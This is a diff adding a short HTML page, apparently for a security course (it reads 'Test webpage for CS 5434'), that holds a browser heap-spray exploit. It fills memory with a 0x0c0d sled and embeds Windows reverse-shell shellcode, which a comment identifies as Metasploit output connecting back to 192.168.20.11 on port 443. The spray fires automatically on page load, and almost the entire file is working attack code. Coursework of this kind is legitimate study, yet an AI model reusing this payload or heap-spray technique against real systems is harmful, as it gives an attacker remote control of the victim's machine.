@@ -1,0 +1,28 @@
+<html>
+<script>
+
+var Array1 = new Array();
+for (i = 0; i < 200; i++)
+{
+  Array1[i] = document.createElement("COMMENT");
+  Array1[i].data = "AAA";
+}
+
+var Element1 = null;
+
+function HeapSpray()
+{ 
+  Array2 = new Array();
+  // msfpayload windows/shell_reverse_tcp LHOST=192.168.20.11 LPORT=443 J
+  var Shellcode = unescape( '%u9090%u9090%ue8fc%u0089%u0000%u8960%u31e5%u64d2%u528b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%uc031%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf0e2%u5752%u528b%u8b10%u3c42%ud001%u408b%u8578%u74c0%u014a%u50d0%u488b%u8b18%u2058%ud301%u3ce3%u8b49%u8b34%ud601%uff31%uc031%uc1ac%u0dcf%uc701%ue038%uf475%u7d03%u3bf8%u247d%ue275%u8b58%u2458%ud301%u8b66%u4b0c%u588b%u011c%u8bd3%u8b04%ud001%u4489%u2424%u5b5b%u5961%u515a%ue0ff%u5f58%u8b5a%ueb12%u5d86%u3368%u0032%u6800%u7377%u5f32%u6854%u774c%u0726%ud5ff%u90b8%u0001%u2900%u54c4%u6850%u8029%u006b%ud5ff%u5050%u5050%u5040%u5040%uea68%udf0f%uffe0%u89d5%u68c7%ua8c0%u0b14%u0268%u0100%u89bb%u6ae6%u5610%u6857%ua599%u6174%ud5ff%u6368%u646d%u8900%u57e3%u5757%uf631%u126a%u5659%ufde2%uc766%u2444%u013c%u8d01%u2444%uc610%u4400%u5054%u5656%u4656%u4e56%u5656%u5653%u7968%u3fcc%uff86%u89d5%u4ee0%u4656%u30ff%u0868%u1d87%uff60%ubbd5%ub5f0%u56a2%ua668%ubd95%uff9d%u3cd5%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5300%ud5ff');
+  var SprayValue = unescape('%u0c0d');
+  do { SprayValue += SprayValue } while( SprayValue.length < 870400 );
+  for (j = 0; j < 100; j++) Array2[j] = SprayValue + Shellcode; 
+}
+
+</script>
+
+<body onload="HeapSpray()">
+Test webpage for CS 5434.
+</body>
+</html> 
